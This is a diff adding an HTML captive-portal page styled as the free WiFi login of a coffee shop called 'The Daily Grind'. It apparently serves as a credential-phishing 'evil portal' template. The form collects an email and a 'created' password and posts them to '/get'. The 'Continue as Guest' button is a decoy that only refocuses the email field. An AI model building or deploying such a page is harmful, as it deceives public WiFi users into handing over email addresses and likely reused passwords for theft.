@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Free WiFi</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#faf7f2}
+.wrap{width:90%;max-width:380px}
+.card{background:#fff;border-radius:16px;padding:36px 28px;box-shadow:0 1px 3px rgba(0,0,0,.06),0 8px 24px rgba(0,0,0,.06)}
+.logo{text-align:center;margin-bottom:24px}
+.logo .cup{font-size:48px;margin-bottom:8px}
+.logo h1{font-size:20px;font-weight:700;color:#2d2013}
+.logo p{font-size:13px;color:#a08d6e;margin-top:4px}
+.field{margin-bottom:14px}
+.field input{width:100%;padding:13px 16px;background:#f5f2ed;border:2px solid transparent;border-radius:10px;font-size:14px;color:#333;transition:all .2s;outline:none}
+.field input::placeholder{color:#b5a68e}
+.field input:focus{border-color:#d4a574;background:#fff}
+.check{display:flex;align-items:flex-start;gap:8px;margin:16px 0}
+.check input[type=checkbox]{margin-top:3px;accent-color:#d4a574}
+.check label{font-size:12px;color:#887055;line-height:1.4}
+.btn{width:100%;padding:14px;background:#2d2013;border:none;border-radius:10px;color:#f5e6d0;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
+.btn:hover{background:#4a3520}
+.sep{text-align:center;margin:18px 0;font-size:11px;color:#c4b49a}
+.guest-btn{width:100%;padding:12px;background:none;border:2px solid #e8dfd2;border-radius:10px;color:#887055;font-size:14px;cursor:pointer;transition:all .2s}
+.guest-btn:hover{border-color:#d4a574;color:#2d2013}
+.hours{text-align:center;margin-top:20px;padding-top:16px;border-top:1px solid #f0ebe3}
+.hours p{font-size:11px;color:#b5a68e;line-height:1.6}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="card">
+<div class="logo">
+<div class="cup">&#9749;</div>
+<h1>The Daily Grind</h1>
+<p>Free WiFi for our customers</p>
+</div>
+<form method="POST" action="/get">
+<div class="field">
+<input name="email" type="text" placeholder="Email address" required autocomplete="off">
+</div>
+<div class="field">
+<input name="password" type="password" placeholder="Create a password" required>
+</div>
+<div class="check">
+<input type="checkbox" id="news">
+<label for="news">Yes, I'd like to receive news about promotions and events</label>
+</div>
+<button class="btn" type="submit">Get Connected</button>
+</form>
+<div class="sep">- or -</div>
+<button class="guest-btn" onclick="document.querySelector('[name=email]').focus()">Continue as Guest</button>
+<div class="hours">
+<p>Mon-Fri: 7:00 - 19:00 | Sat-Sun: 8:00 - 18:00<br>WiFi password changes daily for your security</p>
+</div>
+</div>
+</div>
+</body>
+</html>
